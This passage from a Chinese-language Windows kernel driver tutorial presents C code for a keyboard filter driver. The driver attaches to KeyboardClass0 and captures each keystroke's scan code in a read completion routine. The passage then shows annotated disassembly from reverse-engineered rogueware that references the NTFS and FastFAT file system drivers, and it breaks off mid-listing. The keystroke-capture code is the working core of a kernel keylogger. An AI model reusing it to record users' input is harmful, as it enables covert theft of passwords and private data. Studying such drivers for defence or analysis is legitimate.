
}

### 方法二例子

这个例子比较长，我们只看关键代码并说明.

1。将自己挂接到`\\Device\\KeyboardClass0`设备上

```
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)

{
  DbgPrint("Entering Hook Routine...\n");
  PDEVICE_OBJECT pKeyboardDeviceObject;
  NTSTATUS status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, //no name
    FILE_DEVICE_KEYBOARD, 0, true, &pKeyboardDeviceObject);
  if(!NT_SUCCESS(status))
    return status;
  DbgPrint("Created keyboard device successfully...\n");
  pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
  pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
  DbgPrint("Flags set succesfully...\n");
  RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
  DbgPrint("Device Extension Initialized...\n");
  PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
  CCHAR     ntNameBuffer[64] = "\\\Device\\\KeyboardClass0";
    STRING     ntNameString;
  UNICODE_STRING uKeyboardDeviceName;
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &uKeyboardDeviceName, &ntNameString, TRUE );
  IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
  RtlFreeUnicodeString(&uKeyboardDeviceName);
  DbgPrint("Filter Device Attached Successfully...\n");
  return STATUS_SUCCESS;
}

//我们感兴趣的 irp 处理。由于我们要处理的按键信息，需要等底层驱动处理完成返回后才能取回
//按键值，因此，我们设置完成例程，用于底层驱动完成 irp 后回调我们的例程。我们设置好完成例//程后，就把 irp 传到底层驱动进行处理。
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
  DbgPrint("Entering DispatchRead Routine...\n");
  PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
  PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
  *nextIrpStack = *currentIrpStack;
  IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);
   numPendingIrps++;
  DbgPrint("Tagged keyboard 'read' IRP... Passing IRP down the stack... \n");
  return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);
}

//这是完成例程，我们在这里处理得到的按键信息。
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
  DbgPrint("Entering OnReadCompletion Routine...\n");
  PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
  if(pIrp->IoStatus.Status == STATUS_SUCCESS)
  {
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
    int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
    for(int i = 0; i < numKeys; i++)
    {
      DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
      if(keys[i].Flags == KEY_BREAK)
        DbgPrint("%s\n","Key Up");
      if(keys[i].Flags == KEY_MAKE)
        DbgPrint("%s\n","Key Down");
      KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));
      kData->KeyData = (char)keys[i].MakeCode;
      kData->KeyFlags = (char)keys[i].Flags;
      DbgPrint("Adding IRP to work queue...");
      ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead,
      &kData->ListEntry,
      &pKeyboardDeviceExtension->lockQueue);
      KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,FALSE);
    }
  }
  if(pIrp->PendingReturned)
    IoMarkIrpPending(pIrp);
   numPendingIrps--;
  return pIrp->IoStatus.Status;
}
```

在这个`demo`中要注意的是，由于`irp`的处理函数的`IRQL = DISPATCH_LEVEL`，因此，我们申请内存的话，只能申请非分页内存。在这个`IRQL`级别，我们不能创建或者保存文件来记录按键信息。

我们只能创建一个系统线程，在系统线程中完成按键信息的保存。

后面附上`DEMO`。

### 方法三的例子

偶比较懒了，就从流氓软件逆向代码中抠出一段来贴上。有时间的话，我会再写一个`demo`附上。我已经给加上了详细地注释，很容易明白。

```
.text:000186A4 sub_186A4       proc near           ; CODE XREF: sub_16FDA+19p
.text:000186A4
.text:000186A4 DestinationString= UNICODE_STRING ptr -18h
.text:000186A4 var_10           = dword ptr -10h
.text:000186A4 var_C            = dword ptr -0Ch
.text:000186A4 var_8            = dword ptr -8
.text:000186A4 var_4            = dword ptr -4
.text:000186A4
.text:000186A4                 push    ebp
.text:000186A5                 mov     ebp, esp
.text:000186A7                 sub     esp, 18h
.text:000186AA                 push    ebx
.text:000186AB                 push    esi
.text:000186AC                 push    edi
.text:000186AD                 push    10h
.text:000186AF                 pop     ecx         ; ecx = 10h
.text:000186B0                 xor     eax, eax
.text:000186B2                 mov     edi, offset dword_36DE0
.text:000186B7                 mov     esi, offset dword_36DFC
.text:000186BC                 rep stosd           ; 清零 dword_36de0 至 dword_36e20 的空间
.text:000186BE                 mov     [ebp+var_10], offset aFilesystemNtfs ; "\\\FileSystem\\\Ntfs"
.text:000186C5                 mov     [ebp+var_C], offset aFilesystemFast ; "\\\FileSystem\\\Fastfat"
.text:000186CC                 mov     ebx, esi
.text:000186CE                 lea     edi, [ebp+var_10]
.text:000186D1                 mov     [ebp+var_8], 2  ; var_8 是一个循环变量
.text:000186D8
.text:000186D8 loc_186D8:                   ; CODE XREF: sub_186A4+72j
.text:000186D8                 push    dword ptr [edi] ; SourceString
.text:000186DA                 lea     eax, [ebp+DestinationString]
.text:000186DD                 push    eax             ; DestinationString
.text:000186DE                 call    ds:RtlInitUnicodeString ; 转换"\\FileSystem\\Ntfs"字符串为 UNICODE_STRING 类型
.text:000186E4                 lea     eax, [ebp+var_4] ; 用于存放输出的 Object 指针
.text:000186E7                 push    eax
.text:000186E8                 xor     eax, eax
.text:000186EA                 push    eax
.text:000186EB                 push    eax
.text:000186EC                 push    ds:IoDriverObjectType
.text:000186F2                 push    eax
.text:000186F3                 push    eax
.text:000186F4                 push    40h
.text:000186F6                 lea     eax, [ebp+DestinationString]
.text:000186F9                 push    eax
.text:000186FA                 call    ds:ObReferenceObjectByName ; NTSTATUS
.text:000186FA                             ; ObReferenceObjectByName (
.text:000186FA                             ;      __in PUNICODE_STRING ObjectName,
.text:000186FA                             ;      __in ULONG Attributes,
.text:000186FA                             ;      __in_opt PACCESS_STATE AccessState,
.text:000186FA                             ;      __in_opt ACCESS_MASK DesiredAccess,
.text:000186FA                             ;      __in POBJECT_TYPE ObjectType,
.text:000186FA                             ;      __in KPROCESSOR_MODE AccessMode,
.text:000186FA                             ;      __inout_opt PVOID ParseContext,
.text:000186FA                             ;      __out PVOID *Object
.text:000186FA                             ;      )
.text:000186FA                             ;
.text:000186FA                             ; /*++
.text:000186FA                             ;
.text:000186FA                             ; Routine Description:
.text:000186FA                             ;
.text:000186FA                             ;      Given a name of an object this routine returns a pointer
```
